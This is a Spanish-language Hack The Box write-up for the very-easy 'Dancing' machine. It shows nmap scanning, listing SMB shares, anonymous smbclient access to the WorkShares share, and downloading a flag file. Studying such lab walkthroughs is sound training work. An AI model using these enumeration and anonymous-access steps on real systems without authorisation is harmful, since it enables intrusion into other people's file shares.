+++
title = "Dancing"
description = "Máquina de Starting Point enfocada en la enumeración de servicios y el acceso mediante SMB."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
    "SMB",
    "Enumeration",
    "Starting Point",
    "Foundations"
]

image = "/images/writeups/dancing.png"
+++

### Descripción general

**Dancing** es una máquina perteneciente a **Starting Point** de Hack The Box. Está diseñada para practicar conceptos fundamentales de reconocimiento, enumeración de servicios y acceso a recursos compartidos mediante SMB.

El objetivo consiste en identificar el servicio SMB expuesto, enumerar los recursos compartidos disponibles y acceder a los archivos que contienen la bandera.

---

### Enumeración

Comenzamos realizando un escaneo con **Nmap** para identificar los puertos y servicios disponibles:

```bash
nmap -sV -sC <TARGET_IP>
```

El escaneo muestra los siguientes servicios:

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Los puertos `139/tcp` y `445/tcp` indican que el objetivo expone servicios relacionados con **SMB**, por lo que procedemos a enumerar los recursos compartidos.

Utilizamos `smbclient` para listar los recursos disponibles:

```bash
smbclient -L <TARGET_IP>
```

El servidor muestra los siguientes recursos:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

El recurso `WorkShares` resulta especialmente interesante, ya que se encuentra disponible para acceso sin autenticación.

---

### Acceso inicial

Nos conectamos al recurso compartido utilizando `smbclient` y la opción `-N` para realizar la conexión sin proporcionar contraseña:

```bash
smbclient //<TARGET_IP>/WorkShares -N
```

La conexión se establece correctamente:

```text
Try "help" to get a list of possible commands.
smb: \>
```

Una vez dentro del recurso compartido, listamos su contenido:

```bash
ls
```

Encontramos dos directorios:

```text
Amy.J
James.P
```

Accedemos al directorio `Amy.J`:

```bash
cd Amy.J
ls
```

Dentro encontramos el archivo:

```text
worknotes.txt
```

Descargamos el archivo utilizando `get`:

```bash
get worknotes.txt
```

Posteriormente regresamos al directorio principal y accedemos a `James.P`:

```bash
cd ..
cd James.P
ls
```

En este directorio encontramos:

```text
flag.txt
```

---

### Bandera

Descargamos la bandera utilizando el comando `get`:

```bash
get flag.txt
```

El archivo se descarga correctamente y contiene la bandera de la máquina.

Con esto se completa la máquina **Dancing**.

---

### Conclusión

**Dancing** presenta un escenario sencillo basado principalmente en la enumeración de servicios y el acceso a recursos compartidos mediante SMB.

El proceso seguido fue:

```text
Enumeración
    ↓
Identificación de SMB
    ↓
Enumeración de recursos compartidos
    ↓
Acceso a WorkShares
    ↓
Enumeración de directorios
    ↓
Acceso a James.P
    ↓
Descarga de flag.txt
```

A pesar de su dificultad **Very Easy**, la máquina permite reforzar la importancia de enumerar correctamente los servicios SMB y revisar los recursos compartidos que pueden encontrarse disponibles sin autenticación.

---

### [Estado: Completada](https://labs.hackthebox.com/achievement/machine/3933963/395)

